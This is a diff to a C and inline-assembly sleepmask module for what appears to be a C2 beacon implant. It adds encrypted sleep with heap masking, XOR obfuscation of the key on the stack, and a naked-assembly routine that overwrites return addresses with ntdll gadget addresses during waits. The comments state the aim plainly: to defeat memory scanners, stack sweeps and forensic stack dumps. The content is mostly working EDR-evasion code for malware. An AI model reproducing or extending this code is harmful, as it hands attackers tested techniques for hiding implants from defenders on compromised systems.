@@ -1,11 +1,24 @@
-/* sleepmask BOF — encrypted sleepmask (P2).
+/* sleepmask BOF — encrypted sleepmask (P2) + full-wait stack spoof (P5)
+ * + heap masking & key obfuscation (P6) + encrypt-sleep threshold (P11).
  *
  * Intercepts Sleep/WFSO/WFMO via BeaconGate. On a sleep where the beacon is
- * quiescent (SleepObf enabled, no BOF jobs running), XOR-encrypts the beacon's
- * PIC code region in place with a per-sleep random key, flips it to
+ * quiescent (SleepObf enabled, no BOF jobs running, ms > MinSleepMs), XOR-encrypts
+ * the beacon's PIC code region in place with a per-sleep random key, flips it to
  * PAGE_READWRITE (non-executable) for the wait, then symmetrically XORs-back
  * with the SAME key and restores PAGE_EXECUTE_READ on wake. A memory scanner
  * therefore sees only ciphertext (on a non-exec page) during the sleep window.
+ *
+ * P5 (SpoofWait): the P4 RBP-chain ret rewrite covers the ENTIRE wait, not
+ * only the VP syscalls - periodic stack sweeps of the sleeping thread see
+ * image-backed ntdll frames for the full dwell window. Saved real return
+ * addresses are stored XOR-ed with the ntdll base so no beacon address sits
+ * at rest on the thread stack while sleeping.
+ *
+ * P6: (a) busy blocks of the beacon-owned private heap are masked with the
+ * same per-sleep key and the heap lock is held across the wait (deterministic
+ * wake unmask); (b) the XOR key itself is obfuscated on the stack across the
+ * wait with a wait-recomputable seed (BeaconBase ^ SpoofCount), so a stack
+ * dump alone cannot decrypt the masked spans offline.
  *
  * Restore is symmetric XOR-back (the key lives on this BOF's stack across the
  * blocking wait; the BOF runs in a separate module-stomped DLL region, so its
@@ -13,7 +26,8 @@
  * loader-written stomp tag only populates in the UDRL PIC blob (NULL in the
  * CRT-linked debug EXE used for testing).
  *
- * Guard: encrypt only when SmInfo->Config.SleepObf && SmInfo->ActiveJobCount==0.
+ * Guard: encrypt only when SmInfo->Config.SleepObf && SmInfo->ActiveJobCount==0
+ * && ms > SmInfo->MinSleepMs.
  * ActiveJobCount>0 means a worker thread is inside a BOF that may call back
  * into beacon .text — encrypting it would crash that thread, so we fall back
  * to a plain wait.
@@ -210,6 +224,9 @@ static BOOL SpoofedVirtualProtect( PNAX_SM_INFO Sm, LPVOID lpAddress, SIZE_T dwS
     );
 }
 
+/* ========= [ P11 - encrypted-sleep threshold ] ========= */
+#define NAX_SM_MIN_DEFAULT  1000
+
 /* ========= [ encrypt context - held on the handler stack across the wait ] ========= */
 
 typedef struct _SM_CTX {
@@ -312,6 +329,184 @@ static void SmDecrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
     Ctx->Encrypted = FALSE;
 }
 
+/* ========= [ P5 - full-wait stack spoof ] =========
+ *
+ * Same RBP-chain ret rewrite as SpoofedVirtualProtect, but applied across the
+ * WHOLE NtWaitForSingleObject window: the sleeping thread is the beacon's
+ * heartbeat thread, and during dwell any periodic stack sweep / kernel
+ * stackwalk reads its on-stack return addresses. Spoofing only the VP
+ * syscall instant (P4) leaves the minutes-long wait window exposing private
+ * (CoW) frames above the wait. Here the walk overwrites those return slots
+ * with image-backed ntdll addresses for the entire wait, then restores them
+ * after wake.
+ *
+ * Safety: nothing executes beacon .text during the wait on this thread (it is
+ * encrypted + RW, gated on ActiveJobCount==0), and the frame chain is walked
+ * from the caller's (HandleSleep's) frame with the same TEB bounds +
+ * misalignment stops as the VP trampoline, so a non-frame-pointer rbp simply
+ * ends the walk (less coverage, never a crash).
+ *
+ * The saved real return addresses are stored XOR-ed with the ntdll base so no
+ * beacon .text addresses sit at rest on the sleeping thread's stack (re-derive
+ * at restore time; identical XOR restores them).
+ *
+ * Naked asm: entry rcx=Sm, rdx=hEvent, r8=&timeout. Returns the NTSTATUS from
+ * NtWaitForSingleObject in rax (restore path never touches rax). Falls back to
+ * a direct NtWaitForSingleObject when Sm==NULL or SpoofReady==0.            */
+__attribute__((naked))
+static NTSTATUS SpoofWait( PNAX_SM_INFO Sm, HANDLE hEvent, PLARGE_INTEGER Timeout )
+{
+    __asm__ __volatile__(
+    ".intel_syntax noprefix\n"
+    /* entry: rcx=Sm, rdx=hEvent, r8=timeout ; rsp = X (ret into HandleSleep) */
+    "  mov rax, rcx\n"                     /* rax = Sm */
+    "  test rax, rax\n"
+    "  jz .Lspw_direct\n"
+    "  mov r10d, [rax+0x60]\n"             /* SpoofReady */
+    "  test r10d, r10d\n"
+    "  jz .Lspw_direct\n"
+    /* remap args to NtWaitForSingleObject(hEvent, FALSE, &timeout) */
+    "  mov rcx, rdx\n"
+    "  xor edx, edx\n"
+    "  mov r11, [rax+0x50]\n"              /* NtdllBase -> XOR mask (frame slot below) */
+    "  push rbx\n"
+    "  push rsi\n"
+    "  push rdi\n"
+    "  push r12\n"
+    "  push rbp\n"
+    "  sub rsp, 0x90\n"                    /* rsp0 = X-184 ; 16-aligned (5 pushes + 0x90) */
+    "  mov [rsp+0x20], rcx\n"              /* event   */
+    "  mov [rsp+0x28], r8\n"               /* timeout */
+    "  mov [rsp+0x30], r11\n"              /* XOR mask = NtdllBase */
+    "  mov rsi, gs:[0x10]\n"               /* StackLimit */
+    "  mov rdi, gs:[0x08]\n"               /* StackBase */
+    "  mov [rsp+0x80], rbp\n"              /* start_rbp = HandleSleep frame (entry rbp untouched) */
+    "  xor r12, r12\n"                     /* count = 0 */
+    ".Lspw_walk:\n"
+    "  cmp rbp, rsi\n"
+    "  jb  .Lspw_walk_done\n"
+    "  cmp rbp, rdi\n"
+    "  jae .Lspw_walk_done\n"
+    "  test rbp, 7\n"
+    "  jnz .Lspw_walk_done\n"
+    "  mov rcx, [rbp+8]\n"                 /* this frame's return address */
+    "  cmp rcx, r11\n"
+    "  jb  .Lspw_spoof\n"                  /* < ntdll base -> private, spoof */
+    "  mov r8, [rax+0x58]\n"               /* NtdllSize */
+    "  add r8, r11\n"                      /* NtdllEnd */
+    "  cmp rcx, r8\n"
+    "  jae .Lspw_spoof\n"
+    "  jmp .Lspw_walk_done\n"              /* inside ntdll -> image-backed, stop */
+    ".Lspw_spoof:\n"
+    "  mov r8, [rsp+0x30]\n"               /* mask */
+    "  xor rcx, r8\n"                      /* save obfuscated: real ^ NtdllBase */
+    "  mov [rsp + r12*8 + 0x40], rcx\n"
+    "  xor rcx, r8\n"                      /* restore rcx = real (not needed further, hygiene) */
+    "  mov rdx, [rax+0x48]\n"              /* StackFiller (ntdll .text addr) */
+    "  mov [rbp+8], rdx\n"                 /* overwrite return slot with filler */
+    "  inc r12\n"
+    "  cmp r12, 8\n"
+    "  jae .Lspw_walk_done\n"              /* cap at 8 frames */
+    "  mov rbp, [rbp]\n"                   /* next frame */
+    "  jmp .Lspw_walk\n"
+    ".Lspw_walk_done:\n"
+    "  mov [rsp+0x88], r12\n"
+    "  inc dword ptr [rax+0x64]\n"         /* Sm->SpoofCount++ (wait-spoof diagnostic) */
+    /* set rbx = restore label, push gadget as the wait API's return addr, jmp to API */
+    "  lea rbx, [rip+.Lspw_restore]\n"
+    "  mov rcx, [rsp+0x20]\n"              /* event */
+    "  xor edx, edx\n"                     /* alertable = FALSE */
+    "  mov r8, [rsp+0x28]\n"               /* timeout */
+    "  mov r10, [rax+0x40]\n"              /* JmpRbxGadget (FF E3) */
+    "  push r10\n"                         /* [rsp0-8] = gadget; wait API ret pops it */
+    "  jmp qword ptr [rip+__imp_NTDLL$NtWaitForSingleObject]\n"
+    ".Lspw_restore:\n"
+    /* rsp = rsp0 (API popped gadget). rax = NTSTATUS (untouched below). */
+    "  mov r12, [rsp+0x88]\n"              /* count */
+    "  xor rdi, rdi\n"                     /* index */
+    "  test r12, r12\n"
+    "  jz .Lspw_rest_done\n"
+    ".Lspw_rest_loop:\n"
+    "  mov rsi, [rsp+0x30]\n"              /* XOR mask = NtdllBase */
+    "  mov rcx, [rsp + rdi*8 + 0x40]\n"    /* retsave[i] (stored XOR'd) */
+    "  xor rcx, rsi\n"                     /* real return address */
+    "  mov [rbp+8], rcx\n"                 /* write back to its slot */
+    "  mov rbp, [rbp]\n"                   /* next frame */
+    "  inc rdi\n"
+    "  cmp rdi, r12\n"
+    "  jb .Lspw_rest_loop\n"
+    ".Lspw_rest_done:\n"
+    "  add rsp, 0x90\n"
+    "  pop rbp\n"
+    "  pop r12\n"
+    "  pop rdi\n"
+    "  pop rsi\n"
+    "  pop rbx\n"
+    "  ret\n"
+    ".Lspw_direct:\n"
+    "  mov rcx, rdx\n"                     /* hEvent */
+    "  xor edx, edx\n"                     /* alertable = FALSE */
+    "  jmp qword ptr [rip+__imp_NTDLL$NtWaitForSingleObject]\n"
+    ".att_syntax\n"
+    );
+}
+
+/* ========= [ P6 - key obfuscation across the wait window ] =========
+ * The per-sleep XOR key lives in SM_CTX on the sleeping thread's stack; a
+ * stack-dump during the wait would hand an analyst the key to decrypt the
+ * masked span offline. XOR the key with a seed that is reconstructible at
+ * wake (SmInfo addresses + SpoofCount, none of which are on the stack) so the
+ * plaintext key is never at rest during the wait window. */
+static void SmKeyObf( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
+    ULONG_PTR seed = ( ULONG_PTR )Sm->BeaconBase ^ ( ULONG_PTR )Sm->SpoofCount;
+    for ( UINT32 i = 0; i < NAX_SM_KEY_LEN; i++ )
+        Ctx->Key[ i ] ^= ( BYTE )( seed >> ( ( i & 7 ) * 8 ) );
+}
+
+/* ========= [ P6 - private-heap masking ] =========
+ * The beacon's private heap (Nax->Heap) is exclusively beacon-owned, so busy
+ * blocks (task/result buffers, tunnel state, DNS strings...) are XOR-masked
+ * with the same per-sleep key as the code span. The heap lock stays HELD
+ * across the wait: no other thread can allocate/free from the heap while it
+ * is masked, which makes the wake-time unmask of exactly the masked set
+ * deterministic (a lock-free walk would race new allocations into the set).
+ * Ordering: mask BEFORE the wait (code span already RW-ciphertext), unmask
+ * LAST on wake, only after SmDecrypt restored the code span.             */
+static BOOL SmHeapMaskStart( PNAX_SM_INFO Sm, const BYTE* Key ) {
+    if ( ! Sm || ! Sm->HeapHandle ) return FALSE;
+    if ( ! RtlLockHeap( Sm->HeapHandle ) ) return FALSE;
+    volatile BYTE* v;
+    PROCESS_HEAP_ENTRY e;
+    v = (volatile BYTE*)&e;
+    for ( UINT32 i = 0; i < sizeof( e ); i++ ) v[ i ] = 0;
+    e.lpData = NULL;
+    BOOL masked = FALSE;
+    while ( RtlWalkHeap( Sm->HeapHandle, &e ) ) {
+        if ( ! ( e.wFlags & PROCESS_HEAP_ENTRY_BUSY ) ) continue;
+        if ( ! e.cbData ) continue;
+        SmXorRegion( (PBYTE)e.lpData, (UINT32)e.cbData, Key );
+        masked = TRUE;
+    }
+    if ( ! masked )
+        RtlUnlockHeap( Sm->HeapHandle );
+    return masked;
+}
+
+static void SmHeapMaskEnd( PNAX_SM_INFO Sm, const BYTE* Key ) {
+    if ( ! Sm || ! Sm->HeapHandle ) return;
+    volatile BYTE* v;
+    PROCESS_HEAP_ENTRY e;
+    v = (volatile BYTE*)&e;
+    for ( UINT32 i = 0; i < sizeof( e ); i++ ) v[ i ] = 0;
+    e.lpData = NULL;
+    while ( RtlWalkHeap( Sm->HeapHandle, &e ) ) {
+        if ( ! ( e.wFlags & PROCESS_HEAP_ENTRY_BUSY ) ) continue;
+        if ( ! e.cbData ) continue;
+        SmXorRegion( (PBYTE)e.lpData, (UINT32)e.cbData, Key );
+    }
+    RtlUnlockHeap( Sm->HeapHandle );
+}
+
 /* ========= [ per-API handlers ] ========= */
 
 static void HandleSleep( PFUNCTION_CALL FnCall ) {
@@ -324,29 +519,56 @@ static void HandleSleep( PFUNCTION_CALL FnCall ) {
 
     SM_CTX ctx;
     ctx.Encrypted = FALSE;
-    BOOL enc = SmShouldEncrypt( Sm );
-    if ( enc )
-        SmEncrypt( Sm, &ctx );
 
-    /* wait (PoC: dummy event + timed NtWaitForSingleObject) */
+    /* P11 threshold: below this, skip the whole mask/protect cycle (both VP
+     * calls + the region XOR is measurable VP churn that correlates with
+     * beacon timing; short jitter sleeps buy no scanner evasion). FOLIAGE
+     * uses the same >=1s gate for the same reason. */
+    UINT32 thresh = NAX_SM_MIN_DEFAULT;
+    if ( Sm && Sm->MinSleepMs )
+        thresh = Sm->MinSleepMs;
+
+    BOOL enc = ( ms > thresh ) ? SmShouldEncrypt( Sm ) : FALSE;
+
+    BOOL heapMasked = FALSE;
+    if ( enc ) {
+        SmEncrypt( Sm, &ctx );
+        if ( ctx.Encrypted )
+            heapMasked = SmHeapMaskStart( Sm, ctx.Key );   /* keeps heap locked */
+        if ( ctx.Encrypted )
+            SmKeyObf( Sm, &ctx );       /* P6: key not at rest on the stack */
+    }
+
+    /* P5: full-wait stack spoof (needs P4 machinery resolved + enabled) */
+    BOOL spoofed = ( enc && ctx.Encrypted && Sm->WaitSpoof && Sm->SpoofReady );
+
+    /* wait (dummy event + timed NtWaitForSingleObject) */
     HANDLE hEvent = NULL;
     NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 1, FALSE );
     if ( hEvent ) {
         LARGE_INTEGER timeout;
         timeout.QuadPart = -(LONGLONG)ms * 10000;
-        NtWaitForSingleObject( hEvent, FALSE, &timeout );
+        if ( spoofed )
+            SpoofWait( Sm, hEvent, &timeout );
+        else
+            NtWaitForSingleObject( hEvent, FALSE, &timeout );
         NtClose( hEvent );
     }
 
-    if ( enc )
-        SmDecrypt( Sm, &ctx );
+    if ( enc && ctx.Encrypted ) {
+        SmKeyObf( Sm, &ctx );           /* P6: un-obfuscate for the unmask ops */
+        SmDecrypt( Sm, &ctx );          /* instance span + code span + RX restore */
+        if ( heapMasked )
+            SmHeapMaskEnd( Sm, ctx.Key );   /* unmask + unlock LAST: threads */
+                                            /* blocked on the heap lock resume  */
+                                            /* only into fully restored memory  */
+    }
 
 #ifdef DEBUG
-    /* P4 diagnostic: SpoofCount is incremented by the trampoline on every
-     * spoofed VirtualProtect (SmEncrypt + SmDecrypt = +2 per sleep cycle when
-     * SpoofReady). Stays 0 on the defender lane / when the gadget isn't found
-     * -> the trampoline took the direct-VP fallback. Cumulative, so a steady
-     * +2/cycle proves the spoof path is live and restoring the return chain. */
+    /* P4 diagnostic: SpoofCount is incremented by the trampolines on every
+     * spoofed VirtualProtect (SmEncrypt + SmDecrypt = +2 per cycle) and by
+     * SpoofWait (+1 per full-wait spoof). Stays 0 on the defender lane or
+     * when the gadget isn't found -> the trampolines took direct fallbacks. */
     printf( "[spoof] SpoofReady=%u SpoofCount=%lu\n",
             Sm->SpoofReady, (unsigned long)Sm->SpoofCount );
 #endif
